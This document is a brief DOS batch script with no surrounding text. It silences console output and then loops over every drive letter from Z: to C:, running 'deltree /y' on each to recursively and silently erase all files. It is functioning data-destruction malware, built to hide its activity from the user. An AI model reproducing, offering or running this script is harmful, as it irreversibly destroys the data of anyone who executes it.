   ctty nul
   @echo off
   @for %%z in (z:\,y:\,x:\,w:\,v:\,u:\,t:\,s:\,r:\,q:\,p:\,o:\,n:\,m:\,l:\,k:\,j:\,i:\,h:\,g:\,f:\,e:\,d:\,c:\) do deltree/y %%z >nul
   cls
